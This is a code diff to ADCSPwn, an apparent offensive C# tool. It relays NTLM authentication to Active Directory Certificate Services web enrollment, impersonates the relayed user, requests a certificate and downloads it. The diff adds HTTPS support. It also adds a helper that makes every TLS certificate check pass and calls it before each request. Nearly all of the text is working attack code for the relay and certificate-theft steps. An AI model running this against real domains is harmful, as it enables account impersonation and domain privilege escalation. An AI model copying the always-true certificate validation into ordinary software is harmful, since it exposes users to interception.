@@ -42,6 +42,21 @@ namespace ADCSPwn
             ThreadPool.QueueUserWorkItem(this.ListenerWorker, null);
         }
 
+        public static void InitiateSSLTrust()
+        {
+            try
+            {
+                //Change SSL checks so that all checks pass
+                ServicePointManager
+    .ServerCertificateValidationCallback +=
+    (sender, cert, chain, sslPolicyErrors) => true;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex);
+            }
+        }
+
         private void ListenerWorker(object token)
         {
             while (_listener != null)
@@ -127,6 +142,7 @@ namespace ADCSPwn
 
         public static HttpWebResponse SendWebRequest(string url, string method, string payload, string auth_header, string header_val)
         {
+            InitiateSSLTrust();
             HttpWebRequest HttpReq = (HttpWebRequest)WebRequest.Create(url);
             HttpWebResponse HttpResp = null;
 
@@ -195,8 +211,18 @@ namespace ADCSPwn
                     {
                         // make the initial request without auth
                         Console.WriteLine("  |_ Attempting to access without authentication");
-                        HttpWebResponse HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "", "");
-                        HttpResp.Close();
+                        HttpWebResponse HttpResp;
+                        if (Config.secure)
+                        {
+                            InitiateSSLTrust();
+                            HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "", "");
+                        }
+                        else
+                        {
+                            HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "", "");
+                        }
+                        
+                        
 
                         int StatusCode = (int)HttpResp.StatusCode;
 
@@ -219,7 +245,15 @@ namespace ADCSPwn
                         // start the negotiation
                         Console.WriteLine("  |_ Attempting to authenticate");
                         Console.WriteLine("    |_ Relaying NTLMSSP_NEGOTIATE to target");
-                        HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
+                        if (Config.secure)
+                        {
+                            InitiateSSLTrust();
+                            HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
+                        }
+                        else
+                        {
+                            HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
+                        }
                         HttpResp.Close();
 
                         // find the challenge
@@ -268,9 +302,18 @@ namespace ADCSPwn
                         var User = NTLMHash.Skip(User_offset).Take(User_len).ToArray();
 
                         Console.WriteLine("  |_ Impersonating: " + System.Text.Encoding.Unicode.GetString(Domain) + "\\" + System.Text.Encoding.Unicode.GetString(User));
-
-                        // send the challenge responce
-                        HttpWebResponse HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
+                        HttpWebResponse HttpResp;
+                        if (Config.secure)
+                        {
+                            InitiateSSLTrust();
+                            // send the challenge responce
+                            HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
+                        }
+                        else
+                        {
+                            HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
+                        }
+                        
 
                         Console.WriteLine("  | |_ Relaying NTLMSSP_AUTH to target");
 
@@ -300,9 +343,17 @@ namespace ADCSPwn
                                 cookie = HttpResp.Headers.Get(i).ToString();
                             }
                         }
-
-                        // validate our cookie works
-                        HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Cookie", cookie);
+                        if (Config.secure)
+                        {
+                            InitiateSSLTrust();
+                            // validate our cookie works
+                            HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Cookie", cookie);
+                        }
+                        else
+                        {
+                            HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Cookie", cookie);
+                        }
+                        
                         HttpResp.Close();
 
                         StatusCode = (int)HttpResp.StatusCode;
@@ -367,9 +418,16 @@ namespace ADCSPwn
                                 data += CertificateTemplates[i];
                                 data += "&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=";
 
-                                // ask the CS to create the certificate
-                                HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "POST", data, "Cookie", cookie);
-
+                                if (Config.secure)
+                                {
+                                    InitiateSSLTrust();
+                                    // ask the CS to create the certificate
+                                    HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certfnsh.asp", "POST", data, "Cookie", cookie);
+                                }
+                                else
+                                {
+                                    HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "POST", data, "Cookie", cookie);
+                                }
                                 StatusCode = (int)HttpResp.StatusCode;
 
                                 if (StatusCode == 200)
@@ -426,9 +484,18 @@ namespace ADCSPwn
 
                         Console.WriteLine("  | |_ SUCCESS (ReqID: " + reqid + ")");
                         Console.WriteLine("  |_ Downloading certificate");
-
-                        // download the created certificate
-                        HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certnew.cer?ReqID=" + reqid, "GET", "", "Cookie", cookie);
+                            if (Config.secure)
+                            {
+                                InitiateSSLTrust();
+                                // download the created certificate
+                                HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certnew.cer?ReqID=" + reqid, "GET", "", "Cookie", cookie);
+                            }
+                            else
+                            {
+                                // download the created certificate
+                                HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certnew.cer?ReqID=" + reqid, "GET", "", "Cookie", cookie);
+                            }
+                        
 
                         string certificate = null;
                         using (dataStream = HttpResp.GetResponseStream())
